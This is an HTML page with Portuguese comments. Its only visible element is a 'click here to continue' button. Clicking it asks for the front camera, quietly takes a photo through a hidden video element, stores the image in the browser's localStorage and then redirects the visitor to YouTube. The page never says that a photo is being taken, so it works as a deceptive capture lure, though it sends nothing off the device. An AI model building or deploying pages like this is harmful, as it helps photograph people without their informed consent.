<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
    body {
        margin: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background: #111;
    }

    button {
        padding: 18px 30px;
        font-size: 18px;
        border: none;
        border-radius: 12px;
        background: #00ff88;
        color: #000;
        font-weight: bold;
    }
</style>
</head>

<body>

<video id="webcam" autoplay playsinline muted style="display:none;"></video>

<button id="btn">Clique aqui para continuar</button>

<script>
document.getElementById("btn").addEventListener("click", capturePhoto);

async function capturePhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" } // câmera frontal
        });

        const video = document.getElementById('webcam');
        video.srcObject = stream;

        await video.play();

        // espera garantir que o vídeo está pronto
        setTimeout(() => {

            if (video.videoWidth === 0) {
                alert("Erro ao acessar câmera");
                return;
            }

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL('image/jpeg', 0.9);

            localStorage.setItem('capturedImage', imageData);

            // desliga câmera
            stream.getTracks().forEach(track => track.stop());

            // redireciona
            setTimeout(() => {
                window.location.href = "https://youtube.com";
            }, 500);

        }, 1500); // mais tempo pro celular

    } catch (err) {
        console.log(err);
        alert("Permita acesso à câmera");
    }
}
</script>

</body>
</html>
